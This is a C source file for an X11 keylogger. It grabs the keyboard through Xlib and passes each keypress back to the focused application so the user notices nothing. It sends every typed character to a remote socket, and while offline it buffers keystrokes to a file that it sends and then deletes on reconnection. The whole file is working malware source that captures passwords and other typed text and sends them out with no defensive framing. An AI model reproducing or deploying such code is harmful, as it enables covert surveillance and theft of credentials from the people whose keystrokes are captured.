#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/extensions/XTest.h>

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include "inet_utils.h"
#include "x_utils.h"
#include "file_utils.h"
#include "utils.h"
#include "keylog.h"

int sendMissingStuff() {
	char c;
	char s[2];
	openFile(filename);
	while( (c = getc(fd)) != EOF ) {
		s[0] = c;
		s[1] = '\0';
		sendStr(s);
	}
	closeFile();

	// delete file (is no longer needed)
	remove(filename);
	return 1;
}

void handleChar(int connected, char *buf, KeySym ks) {
	fixStr(buf, ks);

	if(connected)
		sendStr(buf);
	else
		appendFile(filename, buf);

	#ifdef DEBUG
		printf("%s", buf);
		fflush(stdout);
	#endif
}

int main() {
	// open needed stuff
	int connected = connectSocket();
	Display *dpy = XOpenDisplay(NIL);

	// my event
	XEvent event;

	// just in case
	if(connected)
		sendMissingStuff();

	// some stuff for keycode-char conversion
	char buf[2];
	int len;
	KeySym keysym;

	grab(dpy);

	int i = 0;
	while(1) {
		// check for internet connection
		if(i % CONCHECKINTV == 0 && !connected)
			if( (connected = connectSocket()) )
				sendMissingStuff();

		XNextEvent(dpy, &event);

		// convert keycode to character
		if( (len = XLookupString(&event.xkey, buf, 1, &keysym, NULL)) == 0 )
			buf[0] = '\0';

		// forward event to client
		sendSpecEvent(dpy, keysym, event);

		if(event.type == KeyPress) {
			// save key for me
			handleChar(connected, buf, keysym);
		}
		
		i++;
	}

	sendStr("\nEnd of transmission\n");

	ungrab(dpy);
	XCloseDisplay(dpy);
	close(sockfd);

	return 0;
}
